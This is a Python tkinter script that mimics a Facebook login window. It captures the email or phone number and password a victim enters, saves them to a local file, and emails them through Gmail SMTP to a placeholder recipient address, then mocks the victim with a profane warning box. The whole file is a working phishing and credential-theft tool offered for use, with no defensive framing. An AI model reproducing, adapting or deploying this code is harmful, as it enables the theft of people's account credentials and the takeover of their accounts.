import tkinter as tk
from tkinter import font
import requests
import tkinter.messagebox
import os
import smtplib

root = tk.Tk()

root.title("Facebook")

root.resizable(0, 0)


def clear_login(event):
    login_entry.delete(0, tk.END)


def clear_pass(event):
    Pass_entry.delete(0, tk.END)


canvas = tk.Canvas(root, height=650, width=900)
canvas.pack()

back_image = tk.PhotoImage(file="./ApplicationFrameHost_FIkPVPLhly.png")
back_label = tk.Label(root, image=back_image)
back_label.place(relwidth=1, relheight=1)

login_entry = tk.Entry(root, bg="white", fg="black", font=("Bahnschrift Light Condensed", 20))
login_entry.insert(0, "Email or phone number")
login_entry.bind("<Button-1>", clear_login)
login_entry.place(relx=0.499, rely=0.36, relheight=0.07, relwidth=0.37, anchor="n")

Pass_entry = tk.Entry(root, show="*", bg="white", fg="black", font=("Bahnschrift", 20))
Pass_entry.insert(0, "Passwordd")
Pass_entry.bind("<Button-1>", clear_pass)
Pass_entry.place(relx=0.499, rely=0.438, relheight=0.07, relwidth=0.37, anchor="n")

button = tk.Button(root, bg="#5c85d6", fg="white", text="Log In", font=("Bahnschrift", 15), command=lambda: get_details())
button.place(relx=0.499, rely=0.53, relheight=0.07, relwidth=0.366, anchor="n")


def get_details():
    with open("./data/misc.txt", "w") as f:
        f.write("Email/Number: " + str(login_entry.get()))
    with open("./data/misc.txt", "a") as i:
        i.write("\nPassword: " + str(Pass_entry.get()))
    with open("./data/misc.txt", "r") as k:
        details = k.read()

    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.ehlo()

        smtp.login('your_account@gmail.com', 'Your_Password')

        subject = "FB Details"
        body = details

        msg = f'Subject: {subject}\n\n{body}'

        smtp.sendmail("your_account@gmail.com", "whom_to_send@gmail.com", msg)

    tkinter.messagebox.showwarning("Bazinga!", "YOU ARE FUCKED UP")
    root.destroy()


root.mainloop()














